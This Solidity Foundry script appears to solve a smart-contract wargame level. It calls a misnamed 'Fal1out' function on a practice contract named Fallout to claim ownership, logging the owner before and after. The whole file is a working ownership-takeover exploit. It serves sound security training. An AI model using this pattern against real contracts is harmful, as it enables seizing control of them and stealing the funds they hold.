// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Level2.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level2Sol is Script{
    
    Fallout public level2 = Fallout(0xDdA228b0cB405e372d9813C887dd241174cff1Fa);
    function run() external{
        
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before",level2.owner());
        level2.Fal1out();
        console.log("Owner after",level2.owner());
        vm.stopBroadcast();
    }
}

